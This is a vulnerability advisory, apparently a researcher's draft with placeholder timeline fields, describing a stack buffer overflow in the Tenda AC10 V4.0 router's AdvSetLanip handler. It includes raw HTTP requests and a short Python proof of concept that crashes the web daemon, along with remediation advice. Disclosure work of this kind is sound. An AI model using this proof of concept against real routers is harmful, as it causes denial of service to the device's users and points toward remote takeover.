# Tenda AC10 V4.0 - Stack-based Buffer Overflow in AdvSetLanip Handler

## Vulnerability Summary

A critical stack-based buffer overflow vulnerability exists in Tenda AC10 V4.0 router firmware in the `/goform/AdvSetLanip` HTTP POST request handler. The vulnerability allows unauthenticated remote attackers to crash the httpd daemon and potentially achieve remote code execution.

## Affected Component

- **Firmware**: Tenda AC10 V4.0
- **Endpoint**: `/goform/AdvSetLanip`
- **Vulnerable Function**: `fromAdvSetLanip()` (httpd binary) + `GetValue()` (libcommon.so)

## Root Cause

The vulnerability stems from unsafe NVRAM value retrieval:

1. **SetValue()** stores user input to NVRAM without size restriction (accepts up to 1499 bytes)
2. **GetValue()** retrieves NVRAM values into caller-supplied buffers using the stored value length as copy size, ignoring the destination buffer's actual capacity
3. When a small stack buffer retrieves a large NVRAM value, a buffer overflow occurs

## Technical Details

```
char acStack_1a0[16];
GetValue("lan.mask", acStack_1a0);  // 16-byte buffer
// If NVRAM contains 1000 bytes → 984 bytes overflow
// Corrupts: saved $fp, saved $ra (MIPS) → RCE
```

## Attack Vector

**Two-step exploitation:**

1. **Store oversized payload to NVRAM**
   ```
   POST /goform/AdvSetLanip HTTP/1.1
   Content-Type: application/x-www-form-urlencoded
   
   lanMask=AAAA...AAAA (1000+ bytes)
   ```

2. **Trigger GetValue() to overflow stack**
   ```
   POST /goform/AdvSetLanip HTTP/1.1
   
   lanIp=192.168.0.1
   ```

   → httpd crashes with stack corruption

## Proof of Concept

```python
import requests

url = "http://192.168.0.1/goform/AdvSetLanip"

# Step 1: Store oversized payload to NVRAM
data = {"lanMask": "A" * 1000}
requests.post(url, data=data)

# Step 2: Trigger overflow → crash
data = {"lanIp": "192.168.0.1"}
requests.post(url, data=data)

# Result: httpd daemon crashes
```

## Impact

- **Denial of Service**: Crash of httpd daemon (router becomes inaccessible)
- **Remote Code Execution**: Overflow allows control of saved return address ($ra) on MIPS architecture → arbitrary code execution with root privileges
- **No authentication required**: Vulnerability is exploitable from unauthenticated network access

## Remediation

- Update to patched firmware version (if available from Tenda)
- Restrict WAN access to management interface (`/goform/AdvSetLanip`)
- Isolate router from untrusted networks

## Timeline

- **Discovery Date**: [Your date]
- **Vendor Notification**: [If applicable]
- **Public Disclosure**: [Your date]

## References

- Tenda AC10 V4.0 Product Page: [Link if available]

---

**Disclaimer**: This advisory is provided for educational and authorized security research purposes only. Unauthorized access to computer systems is illegal.
